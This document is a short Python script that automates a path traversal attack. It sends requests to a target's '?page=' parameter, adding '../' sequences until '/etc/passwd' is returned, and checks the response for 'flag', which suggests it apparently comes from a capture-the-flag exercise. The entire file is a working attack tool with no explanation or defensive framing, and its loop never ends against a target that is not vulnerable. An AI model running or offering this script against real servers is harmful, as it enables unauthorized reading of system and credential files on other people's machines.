import requests
from bs4 import BeautifulSoup
import sys

def path_traversal(url):
	found = False
	while found == False:
		url += '../'
		full_url = url + 'etc/passwd'
		response = requests.get(full_url)
		print(full_url)
		if response.status_code == 200:
			soup = BeautifulSoup(response.content, 'html.parser')
			# Convert the HTML content to a string
			html_string = str(soup)
			if 'flag' in html_string:
				print('\033[32mFOUND\33[0m')
				found = True

if __name__ == "__main__":
    # Check if an IP address is provided as a command-line argument
	if len(sys.argv) != 2:
		print("Usage: ", sys.argv[0], " <IP_ADDR>")
		sys.exit(1)

# Get the IP address from the command-line argument
ip = sys.argv[1]

path_traversal(ip + '/?page=')